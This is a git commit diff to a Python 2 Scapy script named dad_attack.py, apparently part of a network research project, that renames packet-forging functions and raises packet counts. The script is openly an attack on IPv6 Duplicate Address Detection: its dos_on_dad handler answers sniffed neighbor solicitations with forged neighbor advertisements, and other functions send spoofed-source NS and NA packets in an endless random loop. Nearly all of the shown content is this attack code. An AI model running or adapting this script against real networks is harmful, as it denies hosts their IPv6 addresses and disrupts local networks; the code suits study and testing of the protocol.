8eeeb3b65aba744e516c04672f97d9ff857d1ae5
zero <kp18@mails.tsinghua.edu.cn>
2019-10-23 15:06:44 +0800

    modify dad_attack.py

--- src/dad_attack.py
+++ src/dad_attack.py
@@ -26,22 +26,22 @@ def dos_on_dad(pkt):
                 print "ipv6 dst:",pkt[IPv6].dst
                 target_address = pkt[ICMPv6ND_NS].tgt
                 print "target address:",target_address
-                forge_na_pkt(target_address)
-                #forge_ns_pkt(target_address)
+                na_pkt(target_address)
+                #ns_pkt(target_address)
 
 def send_ns_pkt(pkt):
-    forge_ns_pkt(linkSrcAddr)
+    ns_pkt(linkSrcAddr)
 
 def send_forge_ns_pkt(pkt):
     forge_ns_pkt_with_fake_src(linkSrcAddr)
 
 def send_na_pkt(pkt):
-    forge_na_pkt(linkSrcAddr)
+    na_pkt(linkSrcAddr)
 
 def send_forge_na_pkt(pkt):
     forge_na_pkt_with_diff_src_tgr(linkSrcAddr)
 
-def forge_ns_pkt(target_address):
+def ns_pkt(target_address):
     ether=Ether(src=macSrcAddr,dst=macMultiAddr)
     a=IPv6(src="::", dst='ff02::1:ff21:41f')
     b=ICMPv6ND_NS(tgt=target_address)
@@ -55,7 +55,7 @@ def forge_ns_pkt_with_fake_src(target_address):
     print "send NS packet target address:",target_address
     sendp(ether/a/b,iface=ifaceName)  
 
-def forge_na_pkt(target_address):
+def na_pkt(target_address):
     #segment = target_address.split(":")
     #if segment[0]== "fe80":
     #    print target_address
@@ -83,19 +83,20 @@ if __name__ == "__main__":
     #sniff(filter="ip6",prn=ipv6_monitor_callback,iface=ifaceName,count=1)
     if len(sys.argv)>1:
         if sys.argv[1] == "ns":
-            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
+            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=100)
         if sys.argv[1] == "na":
-            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=3)
+            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=100)
         if sys.argv[1] == "dos":
-            sniff(filter="ip6",prn=dos_on_dad,iface=ifaceName,count=3)
-    while True:
-        way = random.randint(0,4)
-        if way==0:
-            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
-        if way==1:
-            sniff(filter="ip6",prn=send_forge_ns_pkt,iface=ifaceName,count=3)
-        if way==2:
-            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=3)
-        if way==3:
-            sniff(filter="ip6",prn=send_forge_na_pkt,iface=ifaceName,count=3)
+            sniff(filter="ip6",prn=dos_on_dad,iface=ifaceName,count=100)
+    else:
+        while True:
+            way = random.randint(0,4)
+            if way==0:
+                sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName,count=3)
+            if way==1:
+                sniff(filter="ip6",prn=send_forge_ns_pkt,iface=ifaceName,count=3)
+            if way==2:
+                sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName,count=3)
+            if way==3:
+                sniff(filter="ip6",prn=send_forge_na_pkt,iface=ifaceName,count=3)
 
